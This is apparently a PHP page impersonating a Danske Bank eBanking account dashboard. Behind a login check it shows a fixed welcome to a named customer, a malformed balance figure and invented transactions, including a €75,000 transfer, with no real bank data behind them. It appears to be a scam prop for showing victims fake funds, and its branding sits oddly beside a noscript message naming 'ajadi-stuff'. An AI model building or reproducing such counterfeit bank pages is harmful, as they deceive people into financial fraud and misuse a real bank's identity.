<?php session_start(); /* Starts the session */

if(!isset($_SESSION['UserData']['Username'])){
	header("location:login.php");
	exit;
}
?>

<html lang="">
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <link rel="icon" href="favicon.png" />
    <title>Danske Bank - eBanking</title>
    <link href="/css/chunk-04d813b5.b45a042b.css" rel="prefetch" />
    <link href="/css/chunk-9d8e7e80.bdccb1d5.css" rel="prefetch" />
    <link href="/css/chunk-af7f4472.c800c0ee.css" rel="prefetch" />
    <link href="/css/chunk-da2557c4.c638a760.css" rel="prefetch" />
    <link href="/js/chunk-04d813b5.a6c1c390.js" rel="prefetch" />
    <link href="/js/chunk-9d8e7e80.549d3983.js" rel="prefetch" />
    <link href="/js/chunk-af7f4472.b025162b.js" rel="prefetch" />
    <link href="/js/chunk-da2557c4.ecedc9a9.js" rel="prefetch" />
    <link href="/css/app.2f68312d.css" rel="preload" as="style" />
    <link href="/js/app.983bc4ec.js" rel="preload" as="script" />
    <link href="/js/chunk-vendors.3d9c511d.js" rel="preload" as="script" />
    <link href="/css/app.2f68312d.css" rel="stylesheet" />
	<link rel="stylesheet" href="./assets/css/main.css">
    <link
      rel="stylesheet"
      type="text/css"
      href="/css/chunk-da2557c4.c638a760.css"
    />
    <script charset="utf-8" src="/js/chunk-da2557c4.ecedc9a9.js"></script>
  </head>
  <body>
    <noscript
      ><strong
        >We're sorry but ajadi-stuff doesn't work properly without JavaScript
        enabled. Please enable it to continue.</strong
      ></noscript
    >
    <div id="app" data-v-app="">
      <header data-v-20e367dc="">
        <div class="logo" data-v-20e367dc="">
          <img src="./img/logo.png"
            alt="logo"
            data-v-20e367dc=""
          />
        </div>
        <button class="login" data-v-20e367dc="">Log out</button>
      </header>
      <div class="search-box" data-v-20e367dc="" style="display: none">
        <input type="text" data-v-20e367dc="" />
      </div>
      <!---->
      <div class="dashboard" data-v-490f7ae8="" data-v-20e367dc="">
        <div class="user" data-v-490f7ae8="">
          <p class="username" data-v-490f7ae8="">Welcome back, Lauren Milligan</p>
          <p class="amount" data-v-490f7ae8="">
            <span class="dollar" data-v-490f7ae8="">$</span
            ><span class="account__amount" data-v-490f7ae8=""> 874,00.26</span>
          </p>
          <span class="account__desc" data-v-490f7ae8="">
            Available balance
            <svg
              height="18px"
              viewBox="0 0 24 24"
              width="18px"
              fill="#003768"
              data-v-490f7ae8=""
            >
              <path d="M0 0h24v24H0z" fill="none" data-v-490f7ae8=""></path>
              <path
                d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"
                data-v-490f7ae8=""
              ></path></svg></span
          ><span class="date" data-v-490f7ae8=""
            >As of 3/9/2022, 12:04:15 PM</span
          >
        </div>
        <header data-v-490f7ae8="">
          <button disabled="" data-v-490f7ae8="">Activity</button>
        </header>
        <div class="transaction__history" data-v-490f7ae8="">
          <div class="transaction" data-v-490f7ae8="">
            <div class="transaction_desc" data-v-490f7ae8="">
              <span class="_desc" data-v-490f7ae8=""
                >MOB2/UTO/To Ivica Tasńer</span
              ><span class="_amount" data-v-490f7ae8="">-€75,000.00</span>
            </div>
            <div class="transaction_date_status" data-v-490f7ae8="">
              <span class="transaction_date" data-v-490f7ae8="">06/9/2021</span>
              <div class="_status" data-v-490f7ae8="">
                <span data-v-490f7ae8=""></span
                ><!---->
              </div>
            </div>
          </div>
          <div class="transaction" data-v-490f7ae8="">
            <div class="transaction_desc" data-v-490f7ae8="">
              <span class="_desc" data-v-490f7ae8=""
                >Pending: 45574 PREAUTH 008829 CASH APP*BILL LONG*AD gosq.com
                CA</span
              ><span class="_amount" data-v-490f7ae8="">-€350.00</span>
            </div>
            <div class="transaction_date_status" data-v-490f7ae8="">
              <span class="transaction_date" data-v-490f7ae8="">14/6/2019</span>
              <div class="_status" data-v-490f7ae8="">
                <span data-v-490f7ae8="">Pending</span
                ><span data-v-490f7ae8="">€1,500.00</span>
              </div>
            </div>
          </div>
          <div class="transaction" data-v-490f7ae8="">
            <div class="transaction_desc" data-v-490f7ae8="">
              <span class="_desc" data-v-490f7ae8=""
                >31244 PREAUTH 008829 CASH APP*BILL LONG*AD gosq.com CA</span
              ><span class="_amount" data-v-490f7ae8="">-€230.00</span>
            </div>
            <div class="transaction_date_status" data-v-490f7ae8="">
              <span class="transaction_date" data-v-490f7ae8="">13/5/2019</span>
              <div class="_status" data-v-490f7ae8="">
                <span data-v-490f7ae8=""></span
                ><!---->
              </div>
            </div>
          </div>
          <div class="transaction" data-v-490f7ae8="">
            <div class="transaction_desc" data-v-490f7ae8="">
              <span class="_desc" data-v-490f7ae8=""
                >37574 PREAUTH 008829 CASH APP*BILL LONG*AD gosq.com CA</span
              ><span class="_amount" data-v-490f7ae8="">-€750.00</span>
            </div>
            <div class="transaction_date_status" data-v-490f7ae8="">
              <span class="transaction_date" data-v-490f7ae8="">6/5/2018</span>
              <div class="_status" data-v-490f7ae8="">
                <span data-v-490f7ae8=""></span
                ><!---->
              </div>
            </div>
          </div>
          <div class="transaction" data-v-490f7ae8="">
            <div class="transaction_desc" data-v-490f7ae8="">
              <span class="_desc" data-v-490f7ae8=""
                >40074 PREAUTH 008829 CASH APP*BILL LONG*AD gosq.com CA</span
              ><span class="_amount" data-v-490f7ae8="">-€2,010.00</span>
            </div>
            <div class="transaction_date_status" data-v-490f7ae8="">
              <span class="transaction_date" data-v-490f7ae8="">14/4/2018</span>
              <div class="_status" data-v-490f7ae8="">
                <span data-v-490f7ae8=""></span
                ><!---->
              </div>
            </div>
          </div>
          <div class="transaction" data-v-490f7ae8="">
            <div class="transaction_desc" data-v-490f7ae8="">
              <span class="_desc" data-v-490f7ae8=""
                >35074 PREAUTH 008829 CASH APP*BILL LONG*AD gosq.com CA</span
              ><span class="_amount" data-v-490f7ae8="">-€1,350.00</span>
            </div>
            <div class="transaction_date_status" data-v-490f7ae8="">
              <span class="transaction_date" data-v-490f7ae8="">21/3/2018</span>
              <div class="_status" data-v-490f7ae8="">
                <span data-v-490f7ae8=""></span
                ><!---->
              </div>
            </div>
          </div>
        </div>
        <ul class="footer" data-v-490f7ae8="">
          <li data-v-490f7ae8="">
            <div data-v-490f7ae8="">
              <span data-v-490f7ae8=""
                ><svg
                  height="18px"
                  viewBox="0 0 24 24"
                  width="18px"
                  fill="#000000"
                >
                  <path d="M0 0h24v24H0z" fill="none"></path>
                  <path
                    d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"
                  ></path></svg></span
              ><span data-v-490f7ae8="">Home</span>
            </div>
          </li>
          <li data-v-490f7ae8="">
            <div data-v-490f7ae8="">
              <span data-v-490f7ae8=""
                ><svg
                  height="18px"
                  viewBox="0 0 24 24"
                  width="18px"
                  fill="#000000"
                >
                  <path d="M0 0h24v24H0z" fill="none"></path>
                  <path
                    d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"
                  ></path></svg></span
              ><span data-v-490f7ae8="">Accounts</span>
            </div>
          </li>
          <li data-v-490f7ae8="">
            <div data-v-490f7ae8="">
              <span data-v-490f7ae8=""
                ><svg
                  height="18px"
                  viewBox="0 0 24 24"
                  width="18px"
                  fill="#000000"
                >
                  <path d="M0 0h24v24H0z" fill="none"></path>
                  <path
                    d="M11 17h2v-1h1c.55 0 1-.45 1-1v-3c0-.55-.45-1-1-1h-3v-1h4V8h-2V7h-2v1h-1c-.55 0-1 .45-1 1v3c0 .55.45 1 1 1h3v1H9v2h2v1zm9-13H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4V6h16v12z"
                  ></path></svg></span
              ><span data-v-490f7ae8="">Bills</span>
            </div>
          </li>
          <li data-v-490f7ae8="">
            <div data-v-490f7ae8="">
              <span data-v-490f7ae8=""
                ><svg
                  height="18px"
                  viewBox="0 0 24 24"
                  width="18px"
                  fill="#000000"
                >
                  <path d="M0 0h24v24H0z" fill="none"></path>
                  <path
                    d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"
                  ></path></svg></span
              ><span data-v-490f7ae8="">Transfers</span>
            </div>
          </li>
          <li data-v-490f7ae8="">
            <div data-v-490f7ae8="">
              <span data-v-490f7ae8=""
                ><svg
                  enable-background="new 0 0 24 24"
                  height="18px"
                  viewBox="0 0 24 24"
                  width="18px"
                  fill="#000000"
                >
                  <g>
                    <path d="M0,0h24v24H0V0z" fill="none"></path>
                    <path
                      d="M19.14,12.94c0.04-0.3,0.06-0.61,0.06-0.94c0-0.32-0.02-0.64-0.07-0.94l2.03-1.58c0.18-0.14,0.23-0.41,0.12-0.61 l-1.92-3.32c-0.12-0.22-0.37-0.29-0.59-0.22l-2.39,0.96c-0.5-0.38-1.03-0.7-1.62-0.94L14.4,2.81c-0.04-0.24-0.24-0.41-0.48-0.41 h-3.84c-0.24,0-0.43,0.17-0.47,0.41L9.25,5.35C8.66,5.59,8.12,5.92,7.63,6.29L5.24,5.33c-0.22-0.08-0.47,0-0.59,0.22L2.74,8.87 C2.62,9.08,2.66,9.34,2.86,9.48l2.03,1.58C4.84,11.36,4.8,11.69,4.8,12s0.02,0.64,0.07,0.94l-2.03,1.58 c-0.18,0.14-0.23,0.41-0.12,0.61l1.92,3.32c0.12,0.22,0.37,0.29,0.59,0.22l2.39-0.96c0.5,0.38,1.03,0.7,1.62,0.94l0.36,2.54 c0.05,0.24,0.24,0.41,0.48,0.41h3.84c0.24,0,0.44-0.17,0.47-0.41l0.36-2.54c0.59-0.24,1.13-0.56,1.62-0.94l2.39,0.96 c0.22,0.08,0.47,0,0.59-0.22l1.92-3.32c0.12-0.22,0.07-0.47-0.12-0.61L19.14,12.94z M12,15.6c-1.98,0-3.6-1.62-3.6-3.6 s1.62-3.6,3.6-3.6s3.6,1.62,3.6,3.6S13.98,15.6,12,15.6z"
                    ></path>
                  </g></svg></span
              ><span data-v-490f7ae8="">Options</span>
            </div>
          </li>
        </ul>
      </div>
    </div>
    <script src="/js/chunk-vendors.3d9c511d.js"></script>
    <script src="/js/app.983bc4ec.js"></script>
    <div class="betternet-wrapper"></div>
  </body>
  <div id="vimeo-record-extension"></div>
</html>
